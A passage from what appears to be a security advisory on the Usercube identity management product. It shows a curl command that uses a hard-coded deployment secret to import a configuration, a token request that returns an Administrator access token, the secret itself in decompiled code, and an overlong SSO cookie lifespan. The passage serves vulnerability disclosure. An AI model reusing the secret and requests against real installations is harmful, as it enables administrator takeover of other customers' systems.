$ curl 'http://usercube.local:5000/api/Deployment?api-version=1.0&vary=en-US&deployment-slot=Production' -F file=@import.zip -H 'X-Usercubeauthorization: 9kltub854rd36421uty5846hgdqdf' -H 'X-Usercubelegacy: CF83E1357EEFB8BDF1542850D66D8007D620E4050B5715DC83F4A921D36CE9CE47D0D13C5D85F2B0FF8318D2877EEC2F63B931BD47417A81A538327AF927DA3E|CF83E1357EEFB8BDF1542850D66D8007D620E4050B5715DC83F4A921D36CE9CE47D0D13C5D85F2B0FF8318D2877EEC2F63B931BD47417A81A538327AF927DA3E' -x http://127.0.0.1:8080
[13:46:22 INF] Importing the configuration from local directory ../Temp\Deployment\kt3bmqd1.2x3
[13:46:31 INF] Configuration imported

```

A valid `access_token` can then be retrieved:

```

POST /Connect/Token?api-version=1.0 HTTP/1.1
Host: usercube.local:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

client_id=Synacktiv@usercube&client_secret=synacktiv&grant_type=client_credentials

HTTP/1.1 200 OK
Content-Length: 1709
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

{
  "access_token": "eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZDQkMtSFM1MTIiLCJraWQiOiI4ODE5MzQ5NTZENTlBM0ZCOUMxOTdEQjcwMjE1RkZCRUVEMzk2MzlBIiwidHlwIjoiYXQrand0IiwiY3R5IjoiSldUIn0.DdWJkOAGPM8p0cAHvUTQw04P8OHbwTpUAGSJHjQ8Alp_Vuyr9nEEkYIWD-z3YgC84JZGd8ASEQhTH33KB1ulr5mYzmta7KyHq9pH821g2ePqJQxKnRbp2KsnMOdalwt4wFzVmM3a8Fs36dFHu46TgoALoOB9Z5B81mboRXBwcN6PzBaJ7Yn5qJrzP5kq6zd1_CiwtxIOzvxwYS61SkObpv2uvrejEDj13uF70qzNh4x5SPA7Hm5a71TiphJxf9XbvMvTzCURr2wzPbzotKPe80h-kORvpFkHyPoA6quhWxTvRMnRvM08UDfCtIB3cgsTDnpVq5lb39zw9QPGpeNfzQ._Ima6cFoLb1Lgbtl80s3OQ.ixsRfgvRY00E-w0XS34SsNXst0rIPSC2vVheJ-Fu8ZKVBqJP1udwpQwJSMd0nHYljUf6cq882kDGwdqGyOw8TUvpQ0437eDSjw6Jn_T-XmTpBIM4x8r-pmkpC6ovVfNJHI7eAAZjFJRn3Va0vjFakV1pe6uwVovjBEsAQAtFdYzKpWL-H0xfxTaOrMHmgYuWOUTSPjpRVdbyz3HnCMm2Lph5bHROgfUd3HxMzx9IMQPgnQ6lIkyh8ERFRbX9rKpjMnA2Mer34dX0O0CJIKoByRNpq4H7cRr0KlqjVycQYLj_MpK35ePQYRQwVrIslm9Wm90KzjdDb3Zg4u3H3xjoGAt8w6lrHUpCUEVxQDxN2NK-8S-Vk-Yxam6V_VSHhFsnv0PmFn7opY27tQB1vCpHClk7-ueMwgCvlImLEV1O0eYUYsWEn78LdbLOAttIv8xfK69nGUcI7jLzB50Nmh2o3sj-UZkd3982mRtAk2_sb84l_XDVVLgmyMlUaljcmMXNw8e9jTiKAFHTBDc4mu4VzWTlnlizVXd8nll3AHz-XRj-S48vNnz3S-9Un-Q6CYbei0prvDSkDnT6PKoRhhtMNeNLR7Q-HgRMsXWzFlpx6XVKBhnMIbLFCqtFwpXHCqVG0XCtMJ26HRVxcJgJghOXYwLembFk4JxaYJADhTq_L3pwCRsrBfEkOyktRpnUMpeJkjUCUIY75w3j0CFYjez4N-IVUR0mwnmwjNqez9dp1I9jjLff3DrQuENOu1ZFM-dqIBnB5GCIOlxzhrytTIyj7Upvpq0mVm-VSh4CFLW6UUvDdhGAw-VQyS-ZJBMYtHuvxwy3C9qFb4bZHRxdTsADEU_G5lKbkQzVuDqknbdQaCc3UhT-obeFFqif_SQriNjyU3g_tjL7QLelxYQLB5KkLrLHH2wqyWZvMFQnYUYZBf1M2svGl-7QE5uL670FU3tw4BwWp8SRdkMovSwCJv4DluabSojcw_aeq9zvEA8CAaldPRDgX7u_t0fTwn9Qg7WgopwERvRr8TwR4P1Q3QZAaZ_uQhOdp43aNmtSm_1UZFw.7M_sDMi5jyALnNiHk-c9XuqlhszUrtKC8xbUcjj-GEA",
  "token_type": "Bearer",
  "expires_in": 3599
}
```

This token gives privileges of the `Administrator` profile on the application, and can be used to access the web interface.

### Hard-coded secret in the application

#### Description

As described in the first vulnerability, a secret is hard-coded in the libraries of the application and used to authenticate on the deployment functionality.

Two occurrences of this secret have been identified:

* In `Usercube-Server.dll`, in the `ConfigurationService.cs` file and the `TryGetAuthenticationError` function.
* In `Usercube.Configuration.ExecApi`, in the `RemoteAuthenticationValidator.cs` file and the `AddAuthenticationHeaders` function.

```

public void AddAuthenticationHeaders()
{
    if (string.IsNullOrEmpty(this.authenticationTokenAsString) && string.IsNullOrEmpty(this.oldAuthHeader))
    {
        throw new ValidationException("Cannot add headers before authentication has been validated successfully.");
    }
    this.content.Headers.Add(ConfigurationConstants.UsercubeHeader, "9kltub854rd36421uty5846hgdqdf");
[...]
internal static bool TryGetAuthenticationError([Nullable(2)] string secret, [Nullable(2)] string idTokenAsString, [Nullable(2)] string oldAuthHeader, ResetSettings resetSettings, JwtSecurityTokenHandler tokenHandler, ITokenValidationProvider tokenValidationProvider, ILogger logger, string environment, [Nullable(2)] [NotNullWhen(true)] out string errorMessage, out bool isLegacyAuth)
{
    isLegacyAuth = false;
    if (secret != "9kltub854rd36421uty5846hgdqdf")
    {
[...]
```

Â

#### Impact

Because the impacted secret is hard-coded, it is the same for every customer of the Usercube solution. In this case, it would allow an attacker knowing the first vulnerability or with access to the application dynamic libraries to compromise other customers.

### Lifespan of external cookie too important

#### Description

When the Usercube application is configured to use an external identity provider, the endpoint used to validate Single Sign-On returns an `External` cookie.

For example, when using `Saml2`:

```

POST /Saml2/Acs HTTP/2
Host: usercube.local
Content-Type: application/x-www-form-urlencoded

[...]

RelayState=cXnxj1-6U5DfT08zsLDc3VEM&SAMLResponse=PHNhbWx[...]

HTTP/2 303 See Other
Location: /Account/ExternalLoginCallback
Set-Cookie: External=CfD[...]tqw; path=/; secure; samesite=lax; httponly
[...]
```

Then, another call is performed to retrieve the `Session` cookie that is used to authenticate the user:

```

GET /Account/ExternalLoginCallback HTTP/2
Host: usercube.local
Cookie: External=CfD[...]Prw;

[...]

HTTP/2 302 Found
Cache-Control: no-cache,no-store
Pragma: no-cache
Location: /resources/Directory_User?PresenceState.Id=-101%2C-102
Set-Cookie: Session=CfD[...]]Etj; path=/; secure; samesite=strict; httponly
Set-Cookie: External=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; secure; samesite=lax; httponly

```

The `Session` cookie has a short lifespan of 10 minutes. However, the `External` cookie is valid during multiple days (at least 6 days).

#### Impact

If the `External` cookie is retrieved by an attacker, it could be used during its lifespan to gain a valid session for the targeted user.

Partagez cet article


